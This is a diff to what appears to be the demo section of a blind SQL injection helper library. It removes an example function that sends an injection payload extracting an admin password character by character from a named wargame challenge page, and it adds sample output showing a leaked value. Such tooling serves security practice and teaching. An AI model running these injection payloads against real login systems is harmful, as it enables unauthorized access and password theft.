@@ -20,23 +20,10 @@ def example(i, c):
 	return '<h2>Hello admin</h2>' in res.text
 
 
-def example2(i, c):
-	import requests
-	url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
-	params = {
-		'pw': """foo' || id = 'admin' && mid(pw, %d, 1) > '%c""" % (i + 1, c),
-	}
-	cookies = {
-		'PHPSESSID': '???',
-	}
-	res = requests.get(url, params=params, cookies=cookies)
-	return '<h2>Hello admin</h2>' in res.text
-
-
 blind = safflower.blind()
 res = blind.leak(
 	compare_function = example,
-	max_length = 100,
+	max_length = 10,
 	letter_table = blind.MULTI_BYTES,
 	use_logging = True,
 	use_asynchronous = True,
@@ -50,4 +37,17 @@ except:
 	print(res)
 ```
 
-Demo Code of Blind SQL Injection
+```terminal
+$ python demo.py
+[+] LEAK - 　　　　　8　　　　
+[+] LEAK - 　　　　98　　　　
+[+] LEAK - 　　　a98　　　　
+[+] LEAK - 　　　a985　　　
+[+] LEAK - 　9　a985　　　
+[+] LEAK - 09　a985　　　
+[+] LEAK - 095a985　　　
+[+] LEAK - 095a9852　　
+
+00000000: 30 39 35 61 39 38 35 32                           095a9852
+```
+
